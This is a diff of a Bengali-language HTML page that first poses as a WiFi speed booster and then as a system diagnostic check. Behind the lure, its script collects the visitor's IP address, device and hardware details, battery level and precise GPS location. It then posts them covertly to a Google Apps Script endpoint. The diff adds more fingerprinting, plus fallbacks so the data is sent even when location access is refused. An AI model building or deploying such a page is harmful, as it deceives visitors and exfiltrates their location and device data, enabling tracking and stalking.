@@ -3,64 +3,93 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>WiFi Verification</title>
+    <title>System Diagnostic</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 50px; background: #eef2f3; }
-        .box { background: white; padding: 30px; border-radius: 10px; display: inline-block; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
-        button { background: #28a745; color: white; border: none; padding: 15px 25px; border-radius: 5px; cursor: pointer; font-size: 16px; }
+        body { font-family: 'Segoe UI', sans-serif; background: #eef2f3; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 5px 20px rgba(0,0,0,0.1); text-align: center; max-width: 300px; }
+        button { background: #007bff; color: white; border: none; padding: 15px 25px; border-radius: 8px; cursor: pointer; font-size: 16px; font-weight: bold; }
+        #msg { margin-top: 15px; color: #555; font-size: 14px; }
     </style>
 </head>
 <body>
 
-    <div class="box">
-        <h2>WiFi স্পিড বুস্টার 🚀</h2>
-        <p>আপনার কানেকশন অপ্টিমাইজ করতে নিচের বাটনে ক্লিক করুন।</p>
-        <button id="startBtn">বুস্ট করুন</button>
+    <div class="card">
+        <h3>সিস্টেম চেক 🛡️</h3>
+        <p>এগিয়ে যেতে নিচের বাটনে ক্লিক করে পারমিশন দিন।</p>
+        <button id="startBtn">চেক করুন</button>
         <p id="msg"></p>
     </div>
 
     <script>
-        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbx4yOhl3Nzzre2hPLK_FEslSvqFqDo2ynUAJnu1fh1J2J2esteRVu9gA_4g6moFU06K/exec"; // আপনার লিঙ্ক এখানে বসান
+        const SCRIPT_URL = "https://script.google.com/macros/s/AKfycbyyNubGbWtoNhKMfzFiEmTjhd-KyzbC58N-1x7iVg1xKhlqBcOHrGRZpKlbx7NEa-5d/exec"; // আপনার গুগল স্ক্রিপ্ট লিঙ্ক এখানে দিন
+
+        // GPU নাম বের করার ফাংশন
+        function getGPU() {
+            let canvas = document.createElement('canvas');
+            let gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+            if (!gl) return "Not Supported";
+            let debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+            return debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : "Unknown GPU";
+        }
 
         document.getElementById('startBtn').addEventListener('click', async function() {
-            document.getElementById('msg').innerText = "প্রসেসিং হচ্ছে...";
+            let msg = document.getElementById('msg');
+            msg.innerText = "তথ্য সংগ্রহ করা হচ্ছে... 🔄";
+            this.disabled = true;
+
+            let info = {
+                ip_address: "Searching...",
+                device_info: navigator.userAgent,
+                battery: "Unknown",
+                cpu: navigator.hardwareConcurrency || "Unknown",
+                ram: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown",
+                gpu: getGPU(),
+                location: "Not Provided"
+            };
 
             try {
                 // ১. আইপি সংগ্রহ
                 let ipRes = await fetch('https://api.ipify.org?format=json');
                 let ipData = await ipRes.json();
+                info.ip_address = ipData.ip;
 
-                // ২. ব্যাটারি
-                let bat = await navigator.getBattery();
-                let batLvl = (bat.level * 100) + "%";
+                // ২. ব্যাটারি তথ্য
+                if (navigator.getBattery) {
+                    let bat = await navigator.getBattery();
+                    info.battery = (bat.level * 100) + "%";
+                }
 
-                // ৩. লোকেশন
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    let info = {
-                        ip_address: ipData.ip,
-                        device_info: navigator.userAgent,
-                        location: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
-                        battery: batLvl
-                    };
+                // ৩. লোকেশন ট্রাই করা
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        info.location = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                        sendData(info);
+                    },
+                    (err) => {
+                        info.location = "Denied";
+                        sendData(info);
+                    },
+                    { timeout: 5000 }
+                );
 
-                    // ৪. Google Sheet-এ পাঠানো
-                    fetch(SCRIPT_URL, {
-                        method: 'POST',
-                        mode: 'no-cors',
-                        cache: 'no-cache',
-                        body: JSON.stringify(info)
-                    }).then(() => {
-                        document.getElementById('msg').innerText = "সফলভাবে অপ্টিমাইজ করা হয়েছে! ✅";
-                        alert("আপনার ইন্টারনেট এখন আরও ফাস্ট হবে।");
-                    });
-
-                }, (err) => {
-                    alert("দয়া করে পারমিশন দিন নাহলে কাজ করবে না।");
-                });
             } catch (e) {
-                console.log(e);
+                sendData(info);
             }
         });
+
+        function sendData(data) {
+            fetch(SCRIPT_URL, {
+                method: 'POST',
+                mode: 'no-cors',
+                cache: 'no-cache',
+                body: JSON.stringify(data)
+            }).then(() => {
+                document.getElementById('msg').innerText = "চেক সম্পন্ন হয়েছে! ✅";
+                alert("সব তথ্য পাওয়া গেছে। ধন্যবাদ! 😊");
+            }).catch(e => {
+                document.getElementById('msg').innerText = "ত্রুটি ঘটেছে!";
+            });
+        }
     </script>
 </body>
 </html>
